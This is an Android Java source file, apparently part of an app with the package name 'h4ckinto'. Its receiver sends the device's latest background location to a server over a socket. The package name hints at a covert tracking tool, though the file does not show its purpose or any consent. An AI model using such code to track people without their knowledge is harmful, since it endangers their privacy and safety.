package com.h4ckinto.android.managers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.util.Log;

import com.google.android.gms.location.LocationResult;
import com.h4ckinto.android.network.SocketManager;

import java.util.List;

public class LocationUpdateReceiver extends BroadcastReceiver {
    private static final String TAG = "LocationUpdateReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent != null) {
            final String action = intent.getAction();
            if ("com.h4ckinto.android.LOCATION_UPDATE".equals(action)) {
                LocationResult result = LocationResult.extractResult(intent);
                if (result != null) {
                    List<Location> locations = result.getLocations();
                    if (locations != null && !locations.isEmpty()) {
                        Location location = locations.get(locations.size() - 1); // Get latest location
                        sendLocationToServer(context, location);
                    }
                }
            }
        }
    }

    private void sendLocationToServer(Context context, Location location) {
        try {
            SocketManager socketManager = SocketManager.getInstance(context);
            if (socketManager.isConnected()) {
                socketManager.sendLocation(
                    location.getLatitude(),
                    location.getLongitude(),
                    location.getAltitude(),
                    location.getAccuracy(),
                    location.getSpeed()
                );
                Log.d(TAG, "Background location sent: " + location.getLatitude() + ", " + location.getLongitude());
            } else {
                Log.w(TAG, "Socket not connected, cannot send location");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error sending location from receiver", e);
        }
    }
}

